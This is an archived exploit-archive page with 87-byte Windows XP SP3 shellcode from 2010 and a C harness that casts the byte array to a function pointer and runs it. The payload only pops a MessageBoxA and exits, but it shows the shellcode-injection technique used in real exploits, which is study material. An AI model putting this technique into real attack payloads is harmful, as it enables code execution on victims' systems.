<html><head><title>Windows - XP SP3 English MessageBoxA - 87 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* 
Title: Windows XP SP3 English MessageBoxA Shellcode (87 bytes)
Date: August 20, 2010
Author: Glafkos Charalambous (glafkos[@]astalavista[dot]com)
Tested on: Windows XP SP3 En
Thanks: ishtus
Greetz: Astalavista, OffSEC, Exploit-DB
*/

#include &lt;stdio.h&gt;

char shellcode[] =
&quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2&quot;
&quot;\x51\x68\x6c\x6c\x20\x20\x68\x33&quot;
&quot;\x32\x2e\x64\x68\x75\x73\x65\x72&quot;
&quot;\x89\xe1\xbb\x7b\x1d\x80\x7c\x51&quot; // 0x7c801d7b ; LoadLibraryA(user32.dll)
&quot;\xff\xd3\xb9\x5e\x67\x30\xef\x81&quot;
&quot;\xc1\x11\x11\x11\x11\x51\x68\x61&quot;
&quot;\x67\x65\x42\x68\x4d\x65\x73\x73&quot;
&quot;\x89\xe1\x51\x50\xbb\x40\xae\x80&quot; // 0x7c80ae40 ; GetProcAddress(user32.dll, MessageBoxA)
&quot;\x7c\xff\xd3\x89\xe1\x31\xd2\x52&quot;
&quot;\x51\x51\x52\xff\xd0\x31\xc0\x50&quot;
&quot;\xb8\x12\xcb\x81\x7c\xff\xd0&quot;;    // 0x7c81cb12 ; ExitProcess(0)

int main(int argc, char **argv)
{
   int (*func)();
   func = (int (*)()) shellcode;
   printf(&quot;Shellcode Length is : %d&quot;,strlen(shellcode));
   (int)(*func)();
   


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
